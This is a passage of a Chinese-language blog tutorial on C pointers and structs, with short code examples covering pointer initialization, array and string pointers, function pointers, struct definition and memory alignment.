<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char names[2][10] = &#123; &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,&#x27;\0&#x27;&#125;, &#123;&#x27;l&#x27;,&#x27;y&#x27;,&#x27;h&#x27;,&#x27;\0&#x27;&#125; &#125;;</span><br><span class="line">char names2[2][10] = &#123; &#123;&quot;lnj&quot;&#125;, &#123;&quot;lyh&quot;&#125; &#125;;</span><br><span class="line">char names3[2][10] = &#123; &quot;lnj&quot;, &quot;lyh&quot; &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="指针基本概念"><a href="#指针基本概念" class="headerlink" title="指针基本概念"></a>指针基本概念</h2><ul>
<li>什么是地址</li>
</ul>
<p>内存地址:<br><img src="/2022/01/15/C/e46d975be9e95178136726209b2c237f.png" alt="img"></p>
<ul>
<li>地址与内存单元中的数据是两个完全不同的概念<ul>
<li>地址如同房间编号, 根据这个编号我们可以找到对应的房间</li>
<li>内存单元如同房间, 房间是专门用于存储数据的</li>
</ul>
</li>
<li>变量地址:<ul>
<li>系统分配给”变量”的”内存单元”的起始地址</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="number">6</span>; <span class="comment">// 占用4个字节</span></span><br><span class="line"><span class="comment">//那么变量num的地址为: 0ff06</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>; <span class="comment">// 占用1个字节</span></span><br><span class="line"><span class="comment">//那么变量c的地址为:0ff05</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/13eb965757dd130d813a953506335b89.png" alt="img"></p>
<h2 id="什么是指针"><a href="#什么是指针" class="headerlink" title="什么是指针"></a>什么是指针</h2><ul>
<li>在计算机中所有数据都存储在内存单元中,而每个内存单元都有一个对应的地址, 只要通过这个地址就能找到对应单元中存储的数据.</li>
<li>由于通过地址能找到所需的变量单元，所以我们说该地址指向了该变量单元。将地址形象化的称为“指针”</li>
<li>内存单元的指针(地址)和内存单元的内容是两个不同的概念。<br><img src="/2022/01/15/C/540000371e0da0fb105248642ef9db24.png" alt="img"></li>
</ul>
<h2 id="什么是指针变量"><a href="#什么是指针变量" class="headerlink" title="什么是指针变量"></a>什么是指针变量</h2><ul>
<li><p>在C语言中,允许用一个变量来存放其它变量的地址, 这种专门用于存储其它变量地址的变量, 我们称之为指针变量<br><img src="/2022/01/15/C/02442ae9685e56146470369e56ca18ab.png" alt="img"></p>
</li>
<li><p>示例:</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int age;// 定义一个普通变量</span><br><span class="line">num = 10;</span><br><span class="line">int *pnAge; // 定义一个指针变量</span><br><span class="line">pnAge = &amp;age;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/8b7b4d0976ad6e192e3ad6e26282fa8a.png" alt="img"></p>
<h2 id="定义指针变量的格式"><a href="#定义指针变量的格式" class="headerlink" title="定义指针变量的格式"></a>定义指针变量的格式</h2><ul>
<li><p>指针变量的定义包括两个内容:</p>
<ul>
<li>指针类型说明,即定义变量为一个指针变量;</li>
<li>指针变量名;<br><img src="/2022/01/15/C/c051703dcae8535c264ef47c20881b53.png" alt="img"></li>
</ul>
</li>
<li><p>示例:</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch = &#x27;a&#x27;;</span><br><span class="line">char *p; // 一个用于指向字符型变量的指针</span><br><span class="line">p = &amp;ch;  </span><br><span class="line">int num = 666;</span><br><span class="line">int *q; // 一个用于指向整型变量的指针</span><br><span class="line">q = &amp;num;  </span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>其中,*表示这是一个指针变量</li>
<li>变量名即为定义的指针变量名</li>
<li>类型说明符表示本指针变量所指向的变量的数据类型</li>
</ul>
</blockquote>
<h2 id="指针变量的初始化方法"><a href="#指针变量的初始化方法" class="headerlink" title="指针变量的初始化方法"></a>指针变量的初始化方法</h2><ul>
<li>指针变量初始化的方法有两种:定义的同时进行初始化和先定义后初始化<ul>
<li>定义的同时进行初始化</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;a;</span><br></pre></td></tr></table></figure>

<ul>
<li>先定义后初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p=&amp;a;</span><br></pre></td></tr></table></figure>

<ul>
<li>把指针初始化为NULL</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> *q=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>不合法的初始化:<ul>
<li>指针变量只能存储地址, 不能存储其它类型</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p =  <span class="number">250</span>; <span class="comment">// 错误写法</span></span><br></pre></td></tr></table></figure>

<ul>
<li>给指针变量赋值时,指针变量前不能再加“*”</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">*p=&amp;a; <span class="comment">//错误写法</span></span><br></pre></td></tr></table></figure>

<p>注意点:</p>
<ul>
<li><p>多个指针变量可以指向同一个地址<br><img src="/2022/01/15/C/d4c9b29d8ddb808d1a12252fdcdf538a.png" alt="img"></p>
</li>
<li><p>指针的指向是可以改变的</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;a;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">p = &amp;b; <span class="comment">// 修改指针指向</span></span><br></pre></td></tr></table></figure>

<p>指针没有初始化里面是一个垃圾值,这时候我们这是一个野指针</p>
<ul>
<li>野指针可能会导致程序崩溃</li>
<li>野指针访问你不该访问数据</li>
<li>所以指针必须初始化才可以访问其所指向存储区域<br><img src="/2022/01/15/C/e38cdad483acddca8cfcd85e7ac0be78.png" alt="img"></li>
</ul>
<h2 id="访问指针所指向的存储空间"><a href="#访问指针所指向的存储空间" class="headerlink" title="访问指针所指向的存储空间"></a>访问指针所指向的存储空间</h2><ul>
<li>C语言中提供了地址运算符&amp;来表示变量的地址。其一般形式为:<ul>
<li>&amp;变量名;</li>
</ul>
</li>
<li>C语言中提供了*来定义指针变量和访问指针变量指向的内存存储空间<ul>
<li>在定义变量的时候 * 是一个类型说明符,说明定义的这个变量是一个指针变量</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p=<span class="literal">NULL</span>; <span class="comment">// 定义指针变量</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在不是定义变量的时候 *是一个操作符,代表访问指针所指向存储空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d&quot;</span>, *p); <span class="comment">// 访问指针变量</span></span><br></pre></td></tr></table></figure>

<h2 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h2><ul>
<li>在同一种编译器环境下,一个指针变量所占用的内存空间是固定的。<br><img src="/2022/01/15/C/a95f575889111ad8d64cc2c1aa8ecb1e.png" alt="img"></li>
</ul>
<p>虽然在同一种编译器下, 所有指针占用的内存空间是一样的,但不同类型的变量却占不同的字节数</p>
<ul>
<li>一个int占用4个字节，一个char占用1个字节，而一个double占用8字节；</li>
<li>现在只有一个地址，我怎么才能知道要从这个地址开始向后访问多少个字节的存储空间呢，是4个，是1个，还是8个。</li>
<li>所以指针变量需要它所指向的数据类型告诉它要访问多少个字节存储空间<br><img src="/2022/01/15/C/af1fd05a523d9ba4e196e326f537589b.png" alt="img"></li>
</ul>
<h2 id="二级指针"><a href="#二级指针" class="headerlink" title="二级指针"></a>二级指针</h2><ul>
<li>如果一个指针变量存放的又是另一个指针变量的地址,则称这个指针变量为指向指针的指针￼变量。也称为“二级指针”</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c = &#x27;a&#x27;;</span><br><span class="line">char *cp;</span><br><span class="line">cp = &amp;c;</span><br><span class="line">char **cp2;</span><br><span class="line">cp2 = &amp;cp;</span><br><span class="line">printf(&quot;c = %c&quot;, **cp2);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/af331163ce03df7573810fc05ceb03c6.png" alt="img"></p>
<ul>
<li>多级指针的取值规则</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int ***m1;  //取值***m1</span><br><span class="line">int *****m2; //取值*****m2</span><br></pre></td></tr></table></figure>

<h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><ul>
<li>定义一个函数交换两个变量的值</li>
<li>写一个函数，同时返回两个数的和与差</li>
</ul>
<p>##数组指针的概念及定义</p>
<ul>
<li>数组元素指针<ul>
<li>一个变量有地址,一个数组包含若干元素,每个数组元素也有相应的地址, 指针变量也可以保存数组元素的地址</li>
<li>只要一个指针变量保存了数组元素的地址, 我们就称之为数组元素指针<br><img src="/2022/01/15/C/69b98c6401a04bf8fce52a78c80b9565.png" alt="img"></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(“%p %p”, &amp;(a[<span class="number">0</span>]), a); <span class="comment">//输出结果:0x1100, 0x1100</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意: 数组名a不代表整个数组,只代表数组首元素的地址。</li>
<li>“p=a;”的作用是“把a数组的首元素的地址赋给指针变量p”,而不是“把数组a各元素的值赋给 p”</li>
</ul>
</blockquote>
<h2 id="指针访问数组元素"><a href="#指针访问数组元素" class="headerlink" title="指针访问数组元素"></a>指针访问数组元素</h2><p><img src="/2022/01/15/C/13c0dd997ce619b1249220ce09610ad4.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">22</span>&#125;;</span><br><span class="line">      <span class="keyword">int</span> *p;</span><br><span class="line">      <span class="comment">// p = &amp;(a[0]); </span></span><br><span class="line">      p = a;</span><br><span class="line">      <span class="built_in">printf</span>(“%d %d\n”,a[<span class="number">0</span>],*p); <span class="comment">// 输出结果: 2, 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在指针指向数组元素时,允许以下运算:<ul>
<li>加一个整数(用+或+=),如p+1</li>
<li>减一个整数(用-或-=),如p-1</li>
<li>自加运算,如p++,++p</li>
<li>自减运算,如p–,–p</li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/6c563fff4c62724055337604c2d31623.png" alt="img"></p>
<blockquote>
<ul>
<li>如果指针变量p已指向数组中的一个元素,则p+1<code>指向</code>同一数组中的下一个元素,p-1<code>指向</code>同 一数组中的上一个元素。</li>
</ul>
</blockquote>
<ul>
<li>结论: 访问数组元素,可用下面两种方法:<ul>
<li>下标法, 如a[i]形式</li>
<li>指针法, *(p+i)形式</li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/e00312fbc775c04e2a449d7d8d473eb9.png" alt="img"></p>
<ul>
<li>注意:<ul>
<li>数组名虽然是数组的首地址，但是数组名所所保存的数组的首地址是不可以更改的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">int</span> x[<span class="number">10</span>];</span><br><span class="line">x++;  <span class="comment">//错误</span></span><br><span class="line"><span class="keyword">int</span>* p = x;</span><br><span class="line">p++; <span class="comment">//正确</span></span><br></pre></td></tr></table></figure>

<h2 id="指针与字符串"><a href="#指针与字符串" class="headerlink" title="指针与字符串"></a>指针与字符串</h2><ul>
<li>定义字符串的两种方式<ul>
<li>字符数组</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[]=”I love lnj!”;</span><br><span class="line">printf(&quot;%s\n&quot;,string);</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>字符串指针指向字符串</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 数组名保存的是数组第0个元素的地址, 指针也可以保存第0个元素的地址</span><br><span class="line">char *str = &quot;abc&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/cb21fae540cb3290bbc41e7e223d3a41.png" alt="img"></p>
<ul>
<li>字符串指针使用注意事项<ul>
<li>可以查看字符串的每一个字符</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">har *str = &quot;lnj&quot;;</span><br><span class="line">for(int i = 0; i &lt; strlen(str);i++)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;%c-&quot;, *(str+i)); // 输出结果:l-n-j</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>不可以修改字符串内容</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//   + 使用字符数组来保存的字符串是保存栈里的,保存栈里面东西是可读可写,所有可以修改字符串中的的字符</span><br><span class="line">//   + 使用字符指针来保存字符串,它保存的是字符串常量地址,常量区是只读的,所以我们不可以修改字符串中的字符</span><br><span class="line">char *str = &quot;lnj&quot;;</span><br><span class="line">*(str+2) = &#x27;y&#x27;; // 错误</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>不能够直接接收键盘输入</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 错误的原因是:str是一个野指针,他并没有指向某一块内存空间</span><br><span class="line">// 所以不允许这样写如果给str分配内存空间是可以这样用 的</span><br><span class="line">char *str;</span><br><span class="line">scanf(&quot;%s&quot;, str);</span><br></pre></td></tr></table></figure>

<h2 id="指向函数指针"><a href="#指向函数指针" class="headerlink" title="指向函数指针"></a>指向函数指针</h2><ul>
<li>为什么指针可以指向一个函数？<ul>
<li>函数作为一段程序，在内存中也要占据部分存储空间，它也有一个起始地址</li>
<li>函数有自己的地址，那就好办了，我们的指针变量就是用来存储地址的。</li>
<li>因此可以利用一个指针指向一个函数。其中，函数名就代表着函数的地址。</li>
</ul>
</li>
<li>指针函数的定义<ul>
<li>格式: <code>返回值类型 (*指针变量名)(形参1, 形参2, ...);</code></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int (*p)(int,int);</span><br><span class="line">p = sum;</span><br></pre></td></tr></table></figure>

<ul>
<li>指针函数定义技巧<ul>
<li>1、把要指向函数头拷贝过来</li>
<li>2、把函数名称使用小括号括起来</li>
<li>3、在函数名称前面加上一个*</li>
<li>4、修改函数名称</li>
</ul>
</li>
<li>应用场景<ul>
<li>调用函数</li>
<li>将函数作为参数在函数间传递</li>
</ul>
</li>
<li>注意点:<ul>
<li>由于这类指针变量存储的是一个函数的入口地址，所以对它们作加减运算(比如p++)是无意义的</li>
<li>函数调用中”(指针变量名)”的两边的括号不可少,其中的不应该理解为求值运算,在此处它 只是一种表示符号</li>
</ul>
</li>
</ul>
<h2 id="什么是结构体"><a href="#什么是结构体" class="headerlink" title="什么是结构体"></a>什么是结构体</h2><ul>
<li>结构体和数组一样属于构造类型</li>
<li>数组是用于保存一组相同类型数据的, 而结构体是用于保存一组不同类型数组的<ul>
<li>例如,在学生登记表中,姓名应为字符型;学号可为整型或字符型;年龄应为整型;性别应为字符型;成绩可为整型或实型。</li>
<li>显然这组数据不能用数组来存放, 为了解决这个问题,C语言中给出了另一种构造数据类型——“结构(structure)”或叫“结构体”。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="定义结构体类型"><a href="#定义结构体类型" class="headerlink" title="定义结构体类型"></a>定义结构体类型</h2><ul>
<li>在使用结构体之前必须先定义结构体类型, 因为C语言不知道你的结构体中需要存储哪些类型数据, 我们必须通过定义结构体类型来告诉C语言, 我们的结构体中需要存储哪些类型的数据</li>
<li>格式:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct　结构体名&#123;</span><br><span class="line">     类型名1　成员名1;</span><br><span class="line">     类型名2　成员名2;</span><br><span class="line">     ……</span><br><span class="line">     类型名n　成员名n;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>示例:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    char *name; // 姓名</span><br><span class="line">    int age; // 年龄</span><br><span class="line">    float height; // 身高</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="定义结构体变量"><a href="#定义结构体变量" class="headerlink" title="定义结构体变量"></a>定义结构体变量</h2><ul>
<li>定好好结构体类型之后, 我们就可以利用我们定义的结构体类型来定义结构体变量</li>
<li>格式: <code>struct 结构体名 结构体变量名;</code><br><img src="/2022/01/15/C/a19ef99bede1b3b0d689959881390bd0.png" alt="img"></li>
<li>先定义结构体类型，再定义变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> struct Student stu;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义结构体类型的同时定义变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125; stu;</span><br></pre></td></tr></table></figure>

<ul>
<li>匿名结构体定义结构体变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125; stu;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>第三种方法与第二种方法的区别在于,第三种方法中省去了结构体类型名称,而直接给出结构变量,这种结构体最大的问题是结构体类型不能复用</li>
</ul>
</blockquote>
<h2 id="结构体成员访问"><a href="#结构体成员访问" class="headerlink" title="结构体成员访问"></a>结构体成员访问</h2><ul>
<li>一般对结构体变量的操作是以成员为单位进行的，引用的一般形式为：<code>结构体变量名.成员名</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line"> struct Student stu;</span><br><span class="line"> // 访问stu的age成员</span><br><span class="line"> stu.age = 27;</span><br><span class="line"> printf(&quot;age = %d&quot;, stu.age);</span><br></pre></td></tr></table></figure>

<h2 id="结构体变量的初始化"><a href="#结构体变量的初始化" class="headerlink" title="结构体变量的初始化"></a>结构体变量的初始化</h2><ul>
<li>定义的同时按顺序初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line">struct Student stu = &#123;“lnj&quot;, 27&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义的同时不按顺序初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line">struct Student stu = &#123;.age = 35, .name = “lnj&quot;&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>先定义后逐个初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line"> struct Student stu;</span><br><span class="line">stu.name = &quot;lnj&quot;;</span><br><span class="line">stu.age = 35;</span><br></pre></td></tr></table></figure>

<ul>
<li>先定义后一次性初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">     char *name;</span><br><span class="line">     int age;</span><br><span class="line"> &#125;;</span><br><span class="line">struct Student stu;</span><br><span class="line">stu2 = (struct Student)&#123;&quot;lnj&quot;, 35&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="结构体类型作用域"><a href="#结构体类型作用域" class="headerlink" title="结构体类型作用域"></a>结构体类型作用域</h2><ul>
<li>结构类型定义在函数内部的作用域与局部变量的作用域是相同的<ul>
<li>从定义的那一行开始, 直到遇到return或者大括号结束为止</li>
</ul>
</li>
<li>结构类型定义在函数外部的作用域与全局变量的作用域是相同的<ul>
<li>从定义的那一行开始,直到本文件结束为止</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个全局结构体,作用域到文件末尾</span><br><span class="line">struct Person&#123;</span><br><span class="line">    int age;</span><br><span class="line">    char *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    //定义局部结构体名为Person,会屏蔽全局结构体</span><br><span class="line">    //局部结构体作用域,从定义开始到“&#125;”块结束</span><br><span class="line">    struct Person&#123;</span><br><span class="line">        int age;</span><br><span class="line">    &#125;;</span><br><span class="line">    // 使用局部结构体类型</span><br><span class="line">    struct Person pp;</span><br><span class="line">    pp.age = 50;</span><br><span class="line">    pp.name = &quot;zbz&quot;;</span><br><span class="line"></span><br><span class="line">    test();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test() &#123;</span><br><span class="line"></span><br><span class="line">    //使用全局的结构体定义结构体变量p</span><br><span class="line">    struct Person p = &#123;10,&quot;sb&quot;&#125;;</span><br><span class="line">    printf(&quot;%d,%s\n&quot;,p.age,p.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h2><ul>
<li>结构体数组和普通数组并无太大差异, 只不过是数组中的元素都是结构体而已</li>
<li>格式: <code>struct 结构体类型名称 数组名称[元素个数]</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;;</span><br><span class="line">struct Student stu[2]; </span><br></pre></td></tr></table></figure>

<ul>
<li>结构体数组初始化和普通数组也一样, 分为先定义后初始化和定义同时初始化<ul>
<li>定义同时初始化</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;;</span><br><span class="line">struct Student stu[2] = &#123;&#123;&quot;lnj&quot;, 35&#125;,&#123;&quot;zs&quot;, 18&#125;&#125;; </span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>先定义后初始化</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;;</span><br><span class="line">struct Student stu[2]; </span><br><span class="line">stu[0] = &#123;&quot;lnj&quot;, 35&#125;;</span><br><span class="line">stu[1] = &#123;&quot;zs&quot;, 18&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h2><ul>
<li><p>一个指针变量当用来指向一个结构体变量时,称之为结构体指针变量</p>
</li>
<li><p>格式: <code>struct 结构名 *结构指针变量名</code></p>
</li>
<li><p>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     // 定义一个结构体类型</span><br><span class="line">     struct Student &#123;</span><br><span class="line">         char *name;</span><br><span class="line">         int age;</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">    // 定义一个结构体变量</span><br><span class="line">    struct Student stu = &#123;“lnj&quot;, 18&#125;;</span><br><span class="line">  </span><br><span class="line">    // 定义一个指向结构体的指针变量</span><br><span class="line">    struct Student *p;</span><br><span class="line">  </span><br><span class="line">   // 指向结构体变量stu</span><br><span class="line">   p = &amp;stu;</span><br><span class="line">  </span><br><span class="line">    /*</span><br><span class="line">     这时候可以用3种方式访问结构体的成员</span><br><span class="line">     */</span><br><span class="line">    // 方式1：结构体变量名.成员名</span><br><span class="line">    printf(&quot;name=%s, age = %d \n&quot;, stu.name, stu.age);</span><br><span class="line">  </span><br><span class="line">    // 方式2：(*指针变量名).成员名</span><br><span class="line">    printf(&quot;name=%s, age = %d \n&quot;, (*p).name, (*p).age);</span><br><span class="line">  </span><br><span class="line">    // 方式3：指针变量名-&gt;成员名</span><br><span class="line">    printf(&quot;name=%s, age = %d \n&quot;, p-&gt;name, p-&gt;age);</span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>通过结构体指针访问结构体成员, 可以通过以下两种方式</p>
<ul>
<li>(*结构指针变量).成员名</li>
<li>结构指针变量-&gt;成员名(用熟)</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>(pstu)两侧的括号不可少,因为成员符“.”的优先级高于“”。</li>
<li>如去掉括号写作pstu.num则等效于(pstu.num),这样,意义就完全不对了。</li>
</ul>
</blockquote>
<h2 id="结构体内存分析"><a href="#结构体内存分析" class="headerlink" title="结构体内存分析"></a>结构体内存分析</h2><ul>
<li>给结构体变量开辟存储空间和给普通开辟存储空间一样, 会从内存地址大的位置开始开辟</li>
<li>给结构体成员开辟存储空间和给数组元素开辟存储空间一样, 会从所占用内存地址小的位置开始开辟</li>
<li>结构体变量占用的内存空间永远是所有成员中占用内存最大成员的倍数(对齐问题)</li>
</ul>
<blockquote>
<p>+多实际的计算机系统对基本类型数据在内存中存放的位置有限制,它们会要求这些数据的起始地址的值是 某个数k的倍数,这就是所谓的内存对齐,而这个k则被称为该数据类型的对齐模数(alignment modulus)。</p>
<ul>
<li>这种强制的要求一来简化了处理器与内存之间传输系统的设计,二来可以提升读取数据的速度。比如这么一种处理器,它每次读写内存的时候都从某个8倍数的地址开始,一次读出或写入8个字节的数据,假如软件能 保证double类型的数据都从8倍数地址开始,那么读或写一个double类型数据就只需要一次内存操作。否则,我们就可能需要两次内存操作才能完成这个动作,因为数据或许恰好横跨在两个符合对齐要求的8字节 内存块上</li>
</ul>
</blockquote>
<h2 id="结构体变量占用存储空间大小"><a href="#结构体变量占用存储空间大小" class="headerlink" title="结构体变量占用存储空间大小"></a>结构体变量占用存储空间大小</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Person&#123;</span><br><span class="line">    int age; // 4</span><br><span class="line">    char ch; // 1</span><br><span class="line">    double score; // 8</span><br><span class="line">&#125;;</span><br><span class="line">struct Person p;</span><br><span class="line">printf(&quot;sizeof = %i\n&quot;, sizeof(p)); // 16</span><br></pre></td></tr></table></figure>

<ul>
<li>占用内存最大属性是score, 占8个字节, 所以第一次会分配8个字节</li>
<li>将第一次分配的8个字节分配给age4个,分配给ch1个, 还剩下3个字节</li>
<li>当需要分配给score时, 发现只剩下3个字节, 所以会再次开辟8个字节存储空间</li>
<li>一共开辟了两次8个字节空间, 所以最终p占用16个字节</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Person&#123;</span><br><span class="line">    int age; // 4</span><br><span class="line">    double score; // 8</span><br><span class="line">    char ch; // 1</span><br><span class="line">&#125;;</span><br><span class="line">struct Person p;</span><br><span class="line">printf(&quot;sizeof = %i\n&quot;, sizeof(p)); // 24</span><br></pre></td></tr></table></figure>

<ul>
<li>占用内存最大属性是score, 占8个字节, 所以第一次会分配8个字节</li>
<li>将第一次分配的8个字节分配给age4个,还剩下4个字节</li>
<li>当需要分配给score时, 发现只剩下4个字节, 所以会再次开辟8个字节存储空间</li>
<li>将新分配的8个字节分配给score, 还剩下0个字节</li>
<li>当需要分配给ch时, 发现上一次分配的已经没有了, 所以会再次开辟8个字节存储空间</li>
<li>一共开辟了3次8个字节空间, 所以最终p占用24个字节</li>
</ul>
<h2 id="结构体嵌套定义"><a href="#结构体嵌套定义" class="headerlink" title="结构体嵌套定义"></a>结构体嵌套定义</h2><ul>
<li>成员也可以又是一个结构,即构成了嵌套的结构</li>
</ul>
